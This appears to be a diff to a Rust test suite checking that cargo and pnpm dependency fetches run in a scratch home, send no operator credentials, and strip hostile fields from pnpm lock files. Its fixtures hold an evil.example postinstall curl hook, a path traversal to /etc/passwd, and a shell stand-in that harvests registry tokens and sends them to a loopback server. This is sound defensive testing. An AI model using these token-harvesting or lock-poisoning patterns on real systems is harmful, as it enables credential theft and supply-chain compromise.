@@ -126,10 +126,12 @@ fn assert_hostile_environment_withheld(command: &ProbeCommand) {
 fn a_fetch_inherits_only_its_allow_list() {
     let env = fetch_env(&parent_env(), &[]);
     let names: Vec<&str> = env.iter().map(|(name, _)| name.as_str()).collect();
-    for kept in ["PATH", "HOME", "LC_ALL", "HTTPS_PROXY"] {
+    for kept in ["PATH", "LC_ALL", "HTTPS_PROXY"] {
         assert!(names.contains(&kept), "{kept} is kept");
     }
     for dropped in [
+        // A fetch is given the scratch project's home, never the operator's.
+        "HOME",
         "NPM_CONFIG_REGISTRY",
         "npm_config__authToken",
         "CARGO_REGISTRIES_CRATES_IO_TOKEN",
@@ -403,6 +405,20 @@ fn run_cargo_with(
     )
 }
 
+/// Every regular file under `dir`, links not followed.
+fn files_under(dir: &Path) -> Vec<PathBuf> {
+    let mut files = Vec::new();
+    for entry in std::fs::read_dir(dir).unwrap().flatten() {
+        let kind = entry.file_type().unwrap();
+        if kind.is_dir() {
+            files.extend(files_under(&entry.path()));
+        } else if kind.is_file() {
+            files.push(entry.path());
+        }
+    }
+    files
+}
+
 fn leftovers(root: &Path) -> usize {
     std::fs::read_dir(root).map(|dir| dir.count()).unwrap_or(0)
 }
@@ -440,6 +456,11 @@ fn a_missing_crate_is_fetched_from_the_lock_only() {
     assert!(!online.args.contains(&"--offline".to_string()));
     assert_eq!(env_of(online, "CARGO_NET_OFFLINE"), Some("false".into()));
     assert_eq!(
+        env_of(online, "CARGO_HOME"),
+        Some(online.cwd.join(STAGED_CARGO_HOME).into_os_string()),
+        "cargo runs with the staged home, not the host's"
+    );
+    assert_ne!(
         env_of(online, "CARGO_HOME"),
         Some(tree.cargo_home.clone().into_os_string())
     );
@@ -963,8 +984,15 @@ fn pnpm_runs_in_a_scratch_project_of_validated_files_that_is_gone_afterwards() {
                 "the worker's .npmrc is not staged"
             );
             // Nothing the worker wrote reaches the scratch project.
-            for entry in std::fs::read_dir(&command.cwd).unwrap().flatten() {
-                let content = std::fs::read_to_string(entry.path()).unwrap();
+            let files = files_under(&command.cwd);
+            assert!(
+                !files
+                    .iter()
+                    .any(|file| file.starts_with(command.cwd.join(SCRATCH_HOME))),
+                "the scratch home holds no file: {files:?}"
+            );
+            for file in files {
+                let content = std::fs::read_to_string(&file).unwrap();
                 for hostile in [
                     EVIL,
                     "registry",
@@ -975,11 +1003,7 @@ fn pnpm_runs_in_a_scratch_project_of_validated_files_that_is_gone_afterwards() {
                     "cafile",
                     "NPM_TOKEN",
                 ] {
-                    assert!(
-                        !content.contains(hostile),
-                        "{hostile} reached {:?}",
-                        entry.file_name()
-                    );
+                    assert!(!content.contains(hostile), "{hostile} reached {file:?}",);
                 }
             }
             let workspace =
@@ -1182,7 +1206,13 @@ fn the_staged_cargo_project_is_accepted_by_the_real_cargo() {
         cwd: dir.path().to_path_buf(),
         env: fetch_env(
             &crate::core::child_env::vars_os(),
-            &[(CARGO_HOME_ENV, cargo_home.into_os_string())],
+            &[
+                (CARGO_HOME_ENV, cargo_home.into_os_string()),
+                (
+                    "HOME",
+                    crate::core::child_env::var_os("HOME").unwrap_or_default(),
+                ),
+            ],
         ),
         timeout: Duration::from_secs(300),
         priority: Priority::Normal,
@@ -1208,4 +1238,609 @@ fn the_staged_cargo_project_is_accepted_by_the_real_cargo() {
     };
     let staged: toml::Table = toml::from_str(&scan.lock).unwrap();
     assert_eq!(versions(&rewritten), versions(&staged));
+}
+
+// ─── the operator's home and credentials (KT-1674) ────────────────────────
+
+/// The names a tool takes its user configuration directory from.
+const HOME_VARIABLES: [&str; 5] = [
+    "HOME",
+    "USERPROFILE",
+    "APPDATA",
+    "LOCALAPPDATA",
+    "XDG_CONFIG_HOME",
+];
+
+/// `live`: the scratch project still exists (the check runs while the command does).
+fn assert_home_is_in_the_scratch_project(command: &ProbeCommand, live: bool) {
+    for name in HOME_VARIABLES {
+        let value = PathBuf::from(env_of(command, name).unwrap_or_else(|| panic!("{name} unset")));
+        assert!(
+            value.starts_with(command.cwd.join(SCRATCH_HOME)),
+            "{name}={value:?} is outside the scratch project {:?}",
+            command.cwd
+        );
+        assert!(!live || value.is_dir(), "{name}={value:?} exists");
+    }
+    for name in ["HOMEDRIVE", "HOMEPATH", "XDG_CACHE_HOME", "XDG_DATA_HOME"] {
+        assert!(env_of(command, name).is_none(), "{name} is inherited");
+    }
+}
+
+#[test]
+fn a_cargo_fetch_runs_with_a_staged_cargo_home_that_links_only_the_registry() {
+    let tree = tree(Some(&cargo_lock(&[("serde", CRATES_IO)])));
+    // The operator's own Cargo home: a registry, a git cache, and what must stay theirs.
+    std::fs::create_dir_all(tree.cargo_home.join("registry").join("cache")).unwrap();
+    std::fs::create_dir_all(tree.cargo_home.join("git")).unwrap();
+    std::fs::write(
+        tree.cargo_home.join("credentials.toml"),
+        "[registry]\ntoken = \"cargo-secret\"\n",
+    )
+    .unwrap();
+    std::fs::write(
+        tree.cargo_home.join("config.toml"),
+        "[source.crates-io]\nreplace-with = \"mirror\"\n",
+    )
+    .unwrap();
+    std::fs::write(tree.cargo_home.join("credentials"), "legacy-secret").unwrap();
+    let host_home = tree.cargo_home.clone();
+    let runner = FakeRunner::inspecting(
+        false,
+        true,
+        Box::new(move |command| {
+            let staged = PathBuf::from(env_of(command, "CARGO_HOME").unwrap());
+            assert_eq!(staged, command.cwd.join(STAGED_CARGO_HOME));
+            assert_home_is_in_the_scratch_project(command, true);
+            let mut names: Vec<String> = std::fs::read_dir(&staged)
+                .unwrap()
+                .flatten()
+                .map(|entry| entry.file_name().to_string_lossy().into_owned())
+                .collect();
+            names.sort();
+            assert_eq!(names, ["git", "registry"], "only the caches are linked");
+            for name in ["registry", "git"] {
+                assert_eq!(
+                    std::fs::read_link(staged.join(name)).unwrap(),
+                    host_home.join(name)
+                );
+            }
+            // Cargo reads these from `$CARGO_HOME`, so they must not be reachable.
+            for name in ["credentials.toml", "credentials", "config.toml", "config"] {
+                assert!(!staged.join(name).exists(), "{name} is staged");
+            }
+        }),
+    );
+    let step = run_cargo(&tree, &runner).unwrap();
+    assert_eq!(step.outcome, FetchOutcome::Fetched);
+    assert_eq!(runner.commands().len(), 2, "probe and fetch both checked");
+    assert_eq!(leftovers(&tree.scratch_root), 0);
+    // The scratch project is gone; the host's cache and files are untouched.
+    assert!(tree.cargo_home.join("registry").join("cache").is_dir());
+    assert!(tree.cargo_home.join("credentials.toml").is_file());
+}
+
+#[test]
+fn a_host_that_never_fetched_gets_its_registry_directory_filled_not_a_scratch_one() {
+    let tree = tree(Some(&cargo_lock(&[("serde", CRATES_IO)])));
+    assert!(!tree.cargo_home.join("registry").exists());
+    let runner = FakeRunner::new(false, true);
+    run_cargo(&tree, &runner).unwrap();
+    assert!(tree.cargo_home.join("registry").is_dir());
+    assert!(!tree.cargo_home.join("git").exists());
+}
+
+#[test]
+fn a_cargo_fetch_never_gets_the_operators_home() {
+    let tree = tree(Some(&cargo_lock(&[("serde", CRATES_IO)])));
+    let runner = FakeRunner::new(false, true);
+    run_cargo(&tree, &runner).unwrap();
+    let commands = runner.commands();
+    assert_eq!(commands.len(), 2);
+    for command in commands {
+        assert_home_is_in_the_scratch_project(&command, false);
+        for (name, value) in &command.env {
+            assert!(
+                !value.to_string_lossy().contains("/home/operator"),
+                "{name}={value:?} is the operator's home"
+            );
+        }
+    }
+}
+
+#[test]
+fn a_pnpm_fetch_never_gets_the_operators_home() {
+    let tree = pnpm_tree(PNPM_LOCK_OK, None);
+    let runner = FakeRunner::new(false, true);
+    run_pnpm(&tree, &runner).unwrap();
+    let commands = runner.commands();
+    assert_eq!(commands.len(), 2);
+    for command in commands {
+        assert_home_is_in_the_scratch_project(&command, false);
+        for (name, value) in &command.env {
+            assert!(
+                !value.to_string_lossy().contains("/home/operator"),
+                "{name}={value:?} is the operator's home"
+            );
+        }
+    }
+}
+
+#[test]
+fn the_toolchains_a_shim_looks_up_under_home_are_pinned_to_the_operators() {
+    let dir = tempfile::tempdir().unwrap();
+    let home = dir.path().join("operator");
+    std::fs::create_dir_all(home.join(".rustup")).unwrap();
+    std::fs::create_dir_all(home.join(".cache").join("node").join("corepack")).unwrap();
+    let parent = |extra: &[(&str, &str)]| -> Vec<(OsString, OsString)> {
+        let mut env = vec![(OsString::from("HOME"), home.clone().into_os_string())];
+        env.extend(
+            extra
+                .iter()
+                .map(|(name, value)| (OsString::from(name), OsString::from(value))),
+        );
+        env
+    };
+    let pinned = toolchain_homes(&parent(&[]));
+    let names: Vec<&str> = pinned.iter().map(|(name, _)| *name).collect();
+    assert_eq!(names, ["RUSTUP_HOME", "COREPACK_HOME"], "only what exists");
+    assert_eq!(pinned[0].1, home.join(".rustup").into_os_string());
+    // An explicit setting is the operator's own choice and is kept as given.
+    let explicit = toolchain_homes(&parent(&[("RUSTUP_HOME", "/elsewhere")]));
+    assert!(explicit.iter().all(|(name, _)| *name != "RUSTUP_HOME"));
+    assert!(toolchain_homes(&[]).is_empty());
+}
+
+// ─── pnpm-lock.yaml allow-list (KT-1674) ──────────────────────────────────
+
+/// A lock a worker (or a hostile dependency bump) loaded with everything a
+/// `pnpm fetch` could be steered by.
+const PNPM_LOCK_LOADED: &str = "\
+lockfileVersion: '9.0'
+settings:
+  autoInstallPeers: true
+  registry: https://evil.example/
+overrides:
+  left-pad: https://evil.example/left-pad.tgz
+patchedDependencies:
+  left-pad@1.3.0:
+    hash: abc
+    path: patches/../../../etc/passwd
+pnpmfileChecksum: sha256-deadbeef
+x-extra: https://evil.example/extra
+importers:
+  .:
+    dependencies:
+      left-pad:
+        specifier: link:../../host
+        version: link:../../host
+packages:
+  left-pad@1.3.0:
+    resolution: {integrity: sha512-abc+/=}
+    engines: {node: '>=12'}
+    cpu: [arm64]
+    os: [darwin]
+    libc: [glibc]
+    deprecated: use something else
+    hasBin: true
+    peerDependencies: {react: ^18.0.0}
+    peerDependenciesMeta: {react: {optional: true}}
+    bundledDependencies: [inner]
+    name: left-pad
+    version: 1.3.0
+    prepare: true
+    requiresBuild: true
+    funding: https://evil.example/fund
+    hooks: {postinstall: curl evil.example}
+snapshots:
+  left-pad@1.3.0(react@18.2.0):
+    dependencies:
+      react: 18.2.0
+    optionalDependencies:
+      inner: 1.0.0
+    transitivePeerDependencies: [scheduler]
+    optional: true
+    patched: true
+    id: https://evil.example/left-pad.tgz
+    dev: true
+";
+
+fn yaml_keys(value: &serde_yaml::Value) -> Vec<String> {
+    value
+        .as_mapping()
+        .unwrap()
+        .keys()
+        .map(|key| key.as_str().unwrap().to_string())
+        .collect()
+}
+
+#[test]
+fn a_loaded_pnpm_lock_is_rebuilt_from_the_allow_list() {
+    let scan = scan_pnpm_lock(PNPM_LOCK_LOADED).unwrap().unwrap();
+    assert_eq!(scan.packages, 1);
+    for dropped in [
+        "settings",
+        "autoInstallPeers",
+        "overrides",
+        "patchedDependencies",
+        "pnpmfileChecksum",
+        "x-extra",
+        "evil.example",
+        "link:",
+        "passwd",
+        "funding",
+        "hooks",
+        "postinstall",
+        "prepare",
+        "requiresBuild",
+        "patched",
+        "dev:",
+        "specifier",
+    ] {
+        assert!(
+            !scan.lock.contains(dropped),
+            "{dropped} survived:\n{}",
+            scan.lock
+        );
+    }
+    let lock: serde_yaml::Value = serde_yaml::from_str(&scan.lock).unwrap();
+    assert_eq!(
+        yaml_keys(&lock),
+        ["lockfileVersion", "importers", "packages", "snapshots"]
+    );
+    assert_eq!(lock["lockfileVersion"], "9.0");
+    assert!(lock["importers"]["."].as_mapping().unwrap().is_empty());
+
+    let package = &lock["packages"]["left-pad@1.3.0"];
+    assert_eq!(
+        yaml_keys(package),
+        [
+            "resolution",
+            "engines",
+            "cpu",
+            "os",
+            "libc",
+            "deprecated",
+            "hasBin",
+            "bundledDependencies",
+            "peerDependencies",
+            "peerDependenciesMeta"
+        ]
+    );
+    assert_eq!(package["resolution"]["integrity"], "sha512-abc+/=");
+    assert_eq!(package["cpu"][0], "arm64");
+
+    let snapshot = &lock["snapshots"]["left-pad@1.3.0(react@18.2.0)"];
+    assert_eq!(
+        yaml_keys(snapshot),
+        [
+            "dependencies",
+            "optionalDependencies",
+            "transitivePeerDependencies",
+            "optional"
+        ]
+    );
+    assert_eq!(snapshot["dependencies"]["react"], "18.2.0");
+    // What was kept is itself a lock Kronn accepts, unchanged.
+    let again = scan_pnpm_lock(&scan.lock).unwrap().unwrap();
+    assert_eq!(again.lock, scan.lock);
+}
+
+#[test]
+fn a_pnpm_lock_without_snapshots_stages_none() {
+    let scan = scan_pnpm_lock(PNPM_LOCK_OK).unwrap().unwrap();
+    assert!(!scan.lock.contains("snapshots"), "{}", scan.lock);
+    assert!(scan.lock.starts_with("lockfileVersion: '9.0'\nimporters:"));
+}
+
+#[test]
+fn a_pnpm_lock_with_an_unusable_version_or_a_malformed_field_is_refused() {
+    let package = "packages:\n  x@1.0.0:\n    resolution: {integrity: sha512-abc}\n";
+    let versioned = format!("lockfileVersion: '9.0'\n{package}");
+    for lock in [
+        package.to_string(),
+        format!("lockfileVersion: ''\n{package}"),
+        format!("lockfileVersion: [9]\n{package}"),
+        format!("lockfileVersion: 'https://evil.example'\n{package}"),
+        format!("{versioned}    cpu: arm64\n"),
+        format!("{versioned}    hasBin: yes-please\n"),
+        format!("{versioned}    engines: {{node: [1]}}\n"),
+        format!("{versioned}    peerDependenciesMeta: {{a: {{optional: true, evil: 1}}}}\n"),
+        format!("{versioned}snapshots: [x]\n"),
+        format!("{versioned}snapshots:\n  x@1.0.0: sneaky\n"),
+        format!("{versioned}snapshots:\n  'https://evil.example/x': {{}}\n"),
+        format!("{versioned}snapshots:\n  x@1.0.0:\n    dependencies: {{y: 'link:../../host'}}\n"),
+        format!(
+            "{versioned}snapshots:\n  x@1.0.0:\n    dependencies: {{y: 'https://evil.example/y.tgz'}}\n"
+        ),
+        format!("{versioned}snapshots:\n  x@1.0.0:\n    dependencies: [y]\n"),
+    ] {
+        assert!(scan_pnpm_lock(&lock).is_err(), "{lock}");
+    }
+}
+
+#[test]
+fn a_numeric_lockfile_version_is_kept_and_an_empty_snapshot_is_fine() {
+    let lock = "lockfileVersion: 6.0\npackages:\n  x@1.0.0:\n    resolution: {integrity: sha512-abc}\nsnapshots:\n  x@1.0.0: {}\n";
+    let scan = scan_pnpm_lock(lock).unwrap().unwrap();
+    assert!(scan.lock.contains("lockfileVersion: 6.0"), "{}", scan.lock);
+    assert!(scan.lock.contains("x@1.0.0: {}"), "{}", scan.lock);
+}
+
+#[test]
+fn the_staged_pnpm_project_holds_the_rebuilt_lock_only() {
+    let tree = pnpm_tree(PNPM_LOCK_LOADED, None);
+    let runner = FakeRunner::inspecting(
+        true,
+        true,
+        Box::new(|command| {
+            let staged = std::fs::read_to_string(command.cwd.join("pnpm-lock.yaml")).unwrap();
+            for dropped in [
+                "settings",
+                "overrides",
+                "patchedDependencies",
+                "evil.example",
+            ] {
+                assert!(!staged.contains(dropped), "{dropped}:\n{staged}");
+            }
+            assert!(staged.contains("snapshots"));
+        }),
+    );
+    let step = run_pnpm(&tree, &runner).unwrap();
+    assert_eq!(step.outcome, FetchOutcome::Cached);
+    assert_eq!(runner.commands().len(), 1);
+}
+
+// ─── a fake registry that must see no credential (KT-1674) ────────────────
+
+#[cfg(unix)]
+mod fake_registry {
+    use super::*;
+    use crate::core::task_worker_env::ProcessProbeRunner;
+    use std::io::{Read, Write};
+    use std::net::TcpListener;
+    use std::os::unix::fs::PermissionsExt;
+    use std::sync::atomic::{AtomicBool, Ordering};
+    use std::sync::Arc;
+
+    /// What a loopback registry saw: whether each request carried `Authorization`.
+    struct Registry {
+        port: u16,
+        requests: Arc<Mutex<Vec<bool>>>,
+        stop: Arc<AtomicBool>,
+    }
+
+    impl Registry {
+        fn start() -> Self {
+            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
+            listener.set_nonblocking(true).unwrap();
+            let port = listener.local_addr().unwrap().port();
+            let requests = Arc::new(Mutex::new(Vec::new()));
+            let stop = Arc::new(AtomicBool::new(false));
+            let (seen, halt) = (requests.clone(), stop.clone());
+            std::thread::spawn(move || {
+                while !halt.load(Ordering::Relaxed) {
+                    let Ok((mut stream, _)) = listener.accept() else {
+                        std::thread::sleep(Duration::from_millis(10));
+                        continue;
+                    };
+                    stream.set_nonblocking(false).unwrap();
+                    stream
+                        .set_read_timeout(Some(Duration::from_secs(5)))
+                        .unwrap();
+                    let mut head = Vec::new();
+                    let mut chunk = [0u8; 1024];
+                    while !head.windows(4).any(|window| window == b"\r\n\r\n") {
+                        match stream.read(&mut chunk) {
+                            Ok(0) | Err(_) => break,
+                            Ok(read) => head.extend_from_slice(&chunk[..read]),
+                        }
+                    }
+                    let head = String::from_utf8_lossy(&head).to_ascii_lowercase();
+                    seen.lock().unwrap().push(head.contains("authorization:"));
+                    let _ = stream.write_all(
+                        b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n",
+                    );
+                }
+            });
+            Self {
+                port,
+                requests,
+                stop,
+            }
+        }
+
+        fn seen(&self) -> Vec<bool> {
+            self.requests.lock().unwrap().clone()
+        }
+    }
+
+    impl Drop for Registry {
+        fn drop(&mut self) {
+            self.stop.store(true, Ordering::Relaxed);
+        }
+    }
+
+    /// A stand-in for `cargo` and `pnpm`: like them it looks for a registry
+    /// token where they do (`$CARGO_HOME/credentials.toml` and `config.toml`,
+    /// `~/.npmrc`, `~/.config/pnpm/rc`, `$XDG_CONFIG_HOME/pnpm/rc`, the npm user
+    /// config), and talks to the registry with it as an `Authorization` header
+    /// if it finds one. It fails an `--offline` probe so the fetch runs.
+    fn script(port: u16) -> String {
+        format!(
+            r#"#!/bin/sh
+auth=""
+for file in "$CARGO_HOME/credentials.toml" "$CARGO_HOME/config.toml" "$HOME/.npmrc" "$HOME/.config/pnpm/rc" "$XDG_CONFIG_HOME/pnpm/rc" "$npm_config_userconfig"; do
+  if [ -f "$file" ]; then
+    token=$(sed -n -e 's/.*_authToken=//p' -e 's/^token *= *"\(.*\)"/\1/p' "$file" | head -n 1)
+    if [ -n "$token" ]; then auth="$token"; fi
+  fi
+done
+if [ -n "$auth" ]; then
+  curl -s --noproxy '*' -o /dev/null -H "Authorization: Bearer $auth" "http://127.0.0.1:{port}/"
+else
+  curl -s --noproxy '*' -o /dev/null "http://127.0.0.1:{port}/"
+fi
+case " $* " in *" --offline "*) exit 1;; esac
+exit 0
+"#
+        )
+    }
+
+    /// The operator's machine: a home with `.npmrc` and pnpm `rc` files holding
+    /// tokens, and a Cargo home with `credentials.toml` and a `config.toml`.
+    struct Operator {
+        _dir: tempfile::TempDir,
+        bin: PathBuf,
+        home: PathBuf,
+        cargo_home: PathBuf,
+    }
+
+    fn operator(port: u16) -> Operator {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path().canonicalize().unwrap();
+        let bin = root.join("bin");
+        let home = root.join("home");
+        let cargo_home = home.join(".cargo");
+        std::fs::create_dir_all(&bin).unwrap();
+        std::fs::create_dir_all(home.join(".config").join("pnpm")).unwrap();
+        std::fs::create_dir_all(cargo_home.join("registry")).unwrap();
+        for tool in ["cargo", "pnpm"] {
+            let path = bin.join(tool);
+            std::fs::write(&path, script(port)).unwrap();
+            std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
+        }
+        std::fs::write(
+            home.join(".npmrc"),
+            "//registry.npmjs.org/:_authToken=npm-secret\n",
+        )
+        .unwrap();
+        std::fs::write(
+            home.join(".config").join("pnpm").join("rc"),
+            "//registry.npmjs.org/:_authToken=pnpm-secret\n",
+        )
+        .unwrap();
+        std::fs::write(
+            cargo_home.join("credentials.toml"),
+            "[registry]\ntoken = \"cargo-secret\"\n",
+        )
+        .unwrap();
+        std::fs::write(
+            cargo_home.join("config.toml"),
+            "[registries.mirror]\ntoken = \"mirror-secret\"\n",
+        )
+        .unwrap();
+        Operator {
+            _dir: dir,
+            bin,
+            home,
+            cargo_home,
+        }
+    }
+
+    fn operator_env(operator: &Operator) -> Vec<(OsString, OsString)> {
+        let path = format!("{}:/usr/bin:/bin", operator.bin.display());
+        [
+            ("PATH", OsString::from(path)),
+            ("HOME", operator.home.clone().into_os_string()),
+            (
+                "XDG_CONFIG_HOME",
+                operator.home.join(".config").into_os_string(),
+            ),
+            ("CARGO_HOME", operator.cargo_home.clone().into_os_string()),
+        ]
+        .into_iter()
+        .map(|(name, value)| (OsString::from(name), value))
+        .collect()
+    }
+
+    fn curl_present() -> bool {
+        Path::new("/usr/bin/curl").exists()
+    }
+
+    /// The control: given the operator's own home or Cargo home, the stand-in
+    /// finds the planted tokens and sends them — so an absent `Authorization`
+    /// in the tests below means something.
+    #[test]
+    fn the_stand_in_tool_leaks_the_planted_tokens_given_the_operators_home() {
+        if !curl_present() {
+            return;
+        }
+        let registry = Registry::start();
+        let operator = operator(registry.port);
+        let tmp = tempfile::tempdir().unwrap();
+        let base = || ("PATH".to_string(), OsString::from("/usr/bin:/bin"));
+        let cargo_home = operator.cargo_home.clone().into_os_string();
+        let home = operator.home.clone().into_os_string();
+        let xdg = operator.home.join(".config").into_os_string();
+        for (tool, name, value) in [
+            ("cargo", "CARGO_HOME", cargo_home),
+            ("pnpm", "HOME", home),
+            ("pnpm", "XDG_CONFIG_HOME", xdg),
+        ] {
+            let outcome = ProcessProbeRunner.run(&ProbeCommand {
+                program: operator.bin.join(tool).to_string_lossy().into_owned(),
+                args: vec!["fetch".into()],
+                cwd: tmp.path().to_path_buf(),
+                env: vec![base(), (name.to_string(), value)],
+                timeout: Duration::from_secs(30),
+                priority: Priority::Normal,
+                clean_env: true,
+            });
+            assert!(outcome.success, "{}", outcome.detail);
+        }
+        assert_eq!(registry.seen(), [true, true, true]);
+    }
+
+    #[test]
+    fn a_cargo_fetch_sends_no_credential_of_the_operators_cargo_home_or_home() {
+        if !curl_present() {
+            return;
+        }
+        let registry = Registry::start();
+        let operator = operator(registry.port);
+        let mut tree = tree(Some(&cargo_lock(&[("serde", CRATES_IO)])));
+        tree.cargo_home = operator.cargo_home.clone();
+        tree.env = operator_env(&operator);
+        let cancel = CancellationToken::new();
+        let host = FetchHost {
+            scratch_root: &tree.scratch_root,
+            env: &tree.env,
+            runner: &ProcessProbeRunner,
+            cancel: &cancel,
+        };
+        let step = fetch_cargo(
+            &tree.worktree,
+            &tree.manifest_dir,
+            Some(&operator.cargo_home),
+            &host,
+        )
+        .unwrap();
+        assert_eq!(step.outcome, FetchOutcome::Fetched, "{step:?}");
+        // The probe and the fetch both reached the registry, without a credential.
+        assert_eq!(registry.seen(), [false, false]);
+        assert_eq!(leftovers(&tree.scratch_root), 0);
+    }
+
+    #[test]
+    fn a_pnpm_fetch_sends_no_credential_of_the_operators_npmrc_or_pnpm_rc() {
+        if !curl_present() {
+            return;
+        }
+        let registry = Registry::start();
+        let operator = operator(registry.port);
+        let mut tree = pnpm_tree(PNPM_LOCK_OK, None);
+        tree.env = operator_env(&operator);
+        let cancel = CancellationToken::new();
+        let host = FetchHost {
+            scratch_root: &tree.scratch_root,
+            env: &tree.env,
+            runner: &ProcessProbeRunner,
+            cancel: &cancel,
+        };
+        let step = fetch_pnpm(&tree.worktree, &tree.frontend, Some(&tree.store), &host).unwrap();
+        assert_eq!(step.outcome, FetchOutcome::Fetched, "{step:?}");
+        assert_eq!(registry.seen(), [false, false]);
+        assert_eq!(leftovers(&tree.scratch_root), 0);
+    }
 }
